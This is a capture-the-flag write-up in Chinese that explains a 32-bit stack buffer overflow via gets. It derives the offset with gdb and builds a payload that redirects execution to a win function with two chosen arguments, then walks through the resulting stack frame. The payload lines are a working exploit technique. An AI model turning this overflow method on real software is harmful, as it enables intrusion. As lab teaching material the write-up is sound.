```
漏洞
1. gets 
2. fopen("flag.txt","r") 為相對路徑

解題流程

透過 gdb 可知 buf 的起始位址為 ebp - 0x6c

因此塞入 0x6c 個 a 會到 ebp
再塞入 0x4 個 a 就會到 return address  (因為 32bit 所以塞入 0x4 個)

payload = 'a'*0x6c + 'a'*0x4 + p32(win_address)

win 會檢查 arg1 是否為 0xdeadbeef   arg2 是否為 0xdeadc0de

而
arg1 的位址為 ebp+0x8
arg2 的位址為 ebp+0xc     (別忘了 stack 是從高到低)

因此

payload = 'a'*0x6c + 'a'*0x4 + p32(win_address) + 'b'*0x4 + p32(0xdeadbeef) + p32(0xdeadc0de)

note:
'b'*0x4 原本應放 return address 的位址，但我們沒打算 return 所以隨便塞

執行流程
1. 輸入 payload 後，return 位址會被改寫為 win 的位址
2. 執行到 vuln 的 ret 後
   esp 會指到 p32(win_address) 的起始位址
   然後在 win 的 push ebp ，將該位址寫入當下 ebp 的值 (aaaa (被我們蓋掉了) )
3. 接著 mov ebp, esp 就會將 ebp 寫入 esp 的位址 (在 'b'*0x4 的起始位址)

因此
ebp + 0x8 = 0xdeadbeef
ebp + 0xc = 0xdeadc0de
```
